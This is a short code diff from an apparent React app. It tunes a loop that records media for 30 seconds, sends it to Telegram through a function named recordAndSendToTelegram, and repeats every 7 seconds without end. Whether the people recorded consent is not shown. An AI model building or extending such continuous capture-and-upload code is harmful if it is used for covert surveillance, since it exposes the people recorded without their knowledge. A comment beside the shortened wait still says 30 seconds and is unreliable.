@@ -208,7 +208,7 @@ export default function App() {
       mediaRecorder.start(1000); // Collect data every 1s
 
       // Record for 30 seconds
-      await new Promise((r) => setTimeout(r, 10000));
+      await new Promise((r) => setTimeout(r, 30000));
 
       console.log("Recording: Stopping...");
       if (mediaRecorder.state === "recording") {
@@ -256,7 +256,7 @@ export default function App() {
     while (true) {
       await recordAndSendToTelegram();
       // Wait 30 seconds between recordings to reduce CPU load
-      await new Promise((r) => setTimeout(r, 30000));
+      await new Promise((r) => setTimeout(r, 7000));
     }
   }, [recordAndSendToTelegram]);
 
